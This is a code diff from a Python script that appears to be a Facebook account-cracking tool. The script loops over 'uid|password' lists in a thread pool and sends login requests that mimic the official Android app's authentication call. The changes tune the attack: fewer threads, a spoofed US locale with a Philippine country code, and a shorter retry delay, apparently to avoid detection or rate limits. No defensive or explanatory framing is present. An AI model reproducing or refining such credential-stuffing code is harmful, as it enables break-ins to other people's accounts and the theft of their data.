@@ -147,7 +147,7 @@ def gxdsfiles(gxdsfiles1):
     print(f"{white}  [•] FILE SAVE IN:{rc} /sdcard/gxds.txt\n")
     print(f"{dg}  ========================================")
     print(gxdsprnt)
-    with ThreadPool (max_workers=120) as feel:
+    with ThreadPool (max_workers=60) as feel:
         for data in gxdsfiles1:
             uid=data.split("|")[0]
             pwx=[]
@@ -269,8 +269,8 @@ def file_subb(uid,pwx):
             "meta_inf_fbmeta": "",
             "advertiser_id": str(uuid.uuid4()),
             "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
+            "locale": "en_US",
+            "client_country_code": "PH",
             "method": "auth.login",
             "fb_api_req_friendly_name": "authenticate",
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
@@ -309,6 +309,6 @@ def file_subb(uid,pwx):
                 continue
         loop+=1
     except:
-        time.sleep(4)
+        time.sleep(2)
 
 main()
